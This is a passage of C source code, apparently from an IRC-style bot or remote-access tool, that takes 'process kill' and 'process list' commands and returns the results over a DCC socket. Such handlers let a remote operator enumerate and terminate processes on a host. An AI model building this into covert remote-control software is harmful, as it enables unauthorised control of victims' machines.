			if (lstrcmp(arg[1],"kill") == 0)
			{
				if (lstrlen(arg[2]) == 0)
				{
					wsprintf(buffer, "Syntax: process kill <pid>.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
					return 0;
				}
				HANDLE hProc;
				hProc=OpenProcess(PROCESS_TERMINATE,FALSE,atoi(arg[2]));
				if(hProc==NULL) {
					wsprintf(buffer, "Error while killing process.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
					return 0;
				}
				if(TerminateProcess(hProc,0)==0) {
					wsprintf(buffer, "Error while killing process.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
					return 0;
				}
				wsprintf(buffer, "Process terminated.\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
			}
			if (lstrcmp(arg[1],"list") == 0)
			{
				HANDLE hProcess;
				DWORD aProcesses[1024], cbNeeded, cProcesses;
				unsigned int i;
				char szProcessName[MAX_PATH];
				HMODULE hMod;

				if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
				{
					wsprintf(buffer, "EnumProcesses() failed.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
					return 0;
				}
				cProcesses = cbNeeded / sizeof(DWORD);
				wsprintf(buffer, "Number of active processes: %d.\r\n", cProcesses);
				send(dccs, buffer, lstrlen(buffer), 0);
				for (i=0; i<cProcesses; i++)
				{
					strcpy(szProcessName, "unknown");
					hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,aProcesses[i]);
					if (NULL != hProcess)
					{
						if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
						{
							GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
							wsprintf(buffer, "%s - %d.\r\n", szProcessName, aProcesses[i]);
							send(dccs, buffer, lstrlen(buffer), 0);
						}
					}    
					CloseHandle(hProcess);
				}
				wsprintf(buffer, "End of process list.\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
			}
		}
	}
	return 0;
}
